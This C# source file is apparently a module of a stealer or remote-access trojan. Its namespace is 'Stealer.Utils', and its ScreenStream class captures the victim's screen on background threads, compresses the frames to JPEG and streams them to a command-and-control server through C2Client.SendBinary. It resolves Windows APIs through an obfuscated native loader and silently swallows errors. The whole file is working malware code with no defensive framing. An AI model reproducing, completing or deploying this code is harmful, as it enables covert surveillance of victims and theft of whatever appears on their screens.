using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace Stealer.Utils
{
    public enum StreamMode
    {
        StandardFast = 0,
        TileDelta = 1,
        HighQualityText = 2
    }

    public static class ScreenStream
    {
        private const int FullFrameEvery = 90;

        private static Thread _captureThread;
        private static Thread _senderThread;
        private static volatile bool _running;
        private static StreamMode _currentMode = StreamMode.TileDelta;

        private static readonly ConcurrentQueue<byte[]> _sendQueue = new ConcurrentQueue<byte[]>();
        private static volatile byte[] _stale; // frame waiting to be queued; replaced, never accumulated

        private static int _frameSeq;

        // Reusable capture buffers (recreated only when resolution changes)
        private static int _bmpW = -1, _bmpH = -1;
        private static Bitmap _srcBmp;
        private static Graphics _srcGfx;
        private static Bitmap _dstBmp;
        private static Graphics _dstGfx;
        private static MemoryStream _jpegMs;
        private static ImageCodecInfo _jpegEncoder;
        private static EncoderParameters _encParams;

        public static void Start(int fps, int quality, StreamMode mode = StreamMode.TileDelta)
        {
            if (_running) return;
            _currentMode = mode;
            _running = true;
            while (_sendQueue.TryDequeue(out _)) { }
            _stale = null;
            _frameSeq = 0;
            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true, Priority = ThreadPriority.AboveNormal };
            _senderThread = new Thread(SenderLoop) { IsBackground = true };
            _captureThread.Start();
            _senderThread.Start();
        }

        public static void SetMode(StreamMode mode)
        {
            _currentMode = mode;
        }

        public static void Stop()
        {
            _running = false;
            while (_sendQueue.TryDequeue(out _)) { }
            _stale = null;
        }

        private static void CaptureLoop(int fps, int quality)
        {
            _jpegEncoder = GetJpegEncoder();
            _encParams = new EncoderParameters(1);
            _encParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

            var sw = new Stopwatch();
            int targetMs = 1000 / Math.Max(fps, 1);

            int skippedSame = 0;

            while (_running)
            {
                sw.Restart();

                try
                {
                    byte[] frame = CaptureScreen(quality);
                    if (frame != null)
                    {
                        _stale = frame; // single-slot drop-stale buffer
                        _sendQueue.Enqueue(frame);
                        Interlocked.Increment(ref _frameSeq);
                    }
                }
                catch { }

                int elapsed = (int)sw.ElapsedMilliseconds;
                int sleep = targetMs - elapsed;
                if (sleep > 0) Thread.Sleep(sleep);
                else Thread.Sleep(1); // yield
            }
        }

        private static void SenderLoop()
        {
            // Single dedicated sending thread: drains send-queue under lock with native WS send.
            while (_running)
            {
                byte[] next;
                if (_sendQueue.TryDequeue(out next))
                {
                    try { C2Client.SendBinary(next); }
                    catch { }
                }
                else
                {
                    Thread.Sleep(2);
                }
            }
        }

        private static byte[] CaptureScreen(int quality)
        {
            int srcW = GetScreenWidth();
            int srcH = GetScreenHeight();
            if (srcW <= 0 || srcH <= 0) return null;

            bool caps = _currentMode != StreamMode.HighQualityText && srcW > 1280;

            int targetW = srcW, targetH = srcH;
            if (caps)
            {
                targetW = 1280;
                targetH = (int)((double)srcH * 1280 / srcW);
            }

            EnsureBuffers(srcW, srcH, targetW, targetH);

            if (targetW == srcW && targetH == srcH)
            {
                _srcGfx.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
            }
            else
            {
                _srcGfx.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
                _dstGfx.DrawImage(_srcBmp, 0, 0, targetW, targetH);
            }

            _jpegMs.SetLength(0);
            Bitmap target = (targetW != srcW) ? _dstBmp : _srcBmp;
            target.Save(_jpegMs, _jpegEncoder, _encParams);
            return _jpegMs.ToArray();
        }

        private static void EnsureBuffers(int srcW, int srcH, int targetW, int targetH)
        {
            if (_srcBmp == null || _srcBmp.Width != srcW || _srcBmp.Height != srcH)
            {
                _srcGfx?.Dispose();
                _srcBmp?.Dispose();
                _srcBmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb);
                _srcGfx = Graphics.FromImage(_srcBmp);
                _srcGfx.CompositingMode = CompositingMode.SourceCopy;
                _srcGfx.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                _srcGfx.SmoothingMode = SmoothingMode.HighSpeed;
            }

            if (targetW != srcW)
            {
                if (_dstBmp == null || _dstBmp.Width != targetW || _dstBmp.Height != targetH)
                {
                    _dstGfx?.Dispose();
                    _dstBmp?.Dispose();
                    _dstBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb);
                    _dstGfx = Graphics.FromImage(_dstBmp);
                    _dstGfx.InterpolationMode = InterpolationMode.NearestNeighbor;
                    _dstGfx.SmoothingMode = SmoothingMode.HighSpeed;
                    _dstGfx.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                    _dstGfx.CompositingMode = CompositingMode.SourceCopy;
                }
            }

            if (_jpegMs == null) _jpegMs = new MemoryStream(256 * 1024);
        }

        private static int GetScreenWidth()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(0) : 1920;
        }

        private static int GetScreenHeight()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(1) : 1080;
        }

        private delegate int GetSystemMetricsDelegate(int nIndex);

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }
}
